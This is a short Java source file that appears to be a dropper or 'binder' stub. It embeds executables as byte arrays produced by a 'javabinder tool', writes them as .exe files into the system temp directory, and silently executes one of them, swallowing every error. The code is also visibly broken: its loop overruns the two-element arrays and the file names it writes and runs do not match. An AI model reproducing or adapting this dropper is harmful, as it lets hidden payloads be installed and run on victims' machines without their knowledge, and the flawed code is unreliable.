package javare;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 *
 * @author Magician
 */
public class JavaRE {

    /**
     * create two classes called file1,file2 ... and so on
     * put the output of javabinder tool there 
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        byte[][] X = {
            file1.getfile(),//0
            file2.getfile(),//1
        };
        String[] ps = {
            "\\file1.Exe",
            "\\file3.exe",};

        for (int i = 0; i <= 6; i++) {
            try {//write files to temp dir
                Files.write(Paths.get(System.getProperty("java.io.tmpdir") + ps[i]), X[i]);
            } catch (IOException ex) {
            }

        }

        Runtime rt = Runtime.getRuntime();
        try {//execute files in temp
            Process p = rt.exec(System.getProperty("java.io.tmpdir") + "\\file1.exe");
        } catch (IOException ex) {
        }
    }
}
